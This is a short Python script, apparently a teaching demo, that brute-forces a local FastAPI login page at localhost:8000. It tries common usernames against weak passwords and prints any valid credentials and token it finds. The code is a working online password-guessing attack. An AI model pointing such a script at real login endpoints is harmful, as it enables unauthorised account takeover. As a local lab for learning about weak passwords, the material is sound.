#!/usr/bin/env python3
"""
Brute-force attack demonstration script
Uses requests instead of Hydra for educational purposes
"""

import requests
import time
from datetime import datetime

def brute_force_demo():
    """Demonstrate brute-force attack concept"""
    
    url = "http://localhost:8000/login"
    
    # Our dictionaries
    usernames = ["admin", "root", "user", "test"]
    passwords = ["12345", "password", "admin", "12345admin", "qwerty"]
    
    print("=" * 60)
    print("BRUTE-FORCE ATTACK DEMONSTRATION")
    print("=" * 60)
    print(f"Attack started: {datetime.now().strftime('%H:%M:%S')}")
    print("-" * 60)
    
    attempts = 0
    start_time = time.time()
    
    for username in usernames:
        for password in passwords:
            attempts += 1
            
            # Send request
            data = {"username": username, "password": password}
            
            try:
                response = requests.post(url, data=data)
                result = response.json()
                
                success = result.get("status") == "success"
                status = "✅ SUCCESS" if success else "❌ FAILED"
                
                print(f"[{attempts:2d}] {status} | {username}:{password}")
                
                if success:
                    print("-" * 60)
                    print(f"✅ CORRECT CREDENTIALS FOUND!")
                    print(f"   Username: {username}")
                    print(f"   Password: {password}")
                    print(f"   Token: {result.get('token', 'N/A')}")
                    print("-" * 60)
                    
                    elapsed = time.time() - start_time
                    print(f"Attack time: {elapsed:.2f} seconds")
                    print(f"Total attempts: {attempts}")
                    
                    return username, password
                    
            except requests.exceptions.ConnectionError:
                print(f"❌ ERROR: Server not accessible at {url}")
                print("   Make sure FastAPI server is running!")
                return None, None
                
            except Exception as e:
                print(f"❌ ERROR: {str(e)}")
    
    elapsed = time.time() - start_time
    print("-" * 60)
    print("❌ CORRECT CREDENTIALS NOT FOUND")
    print(f"Attack time: {elapsed:.2f} seconds")
    print(f"Total attempts: {attempts}")
    
    return None, None

if __name__ == "__main__":
    print("⚠️  FOR EDUCATIONAL PURPOSES ONLY - LOCAL TESTING ONLY ⚠️")
    print()
    brute_force_demo()
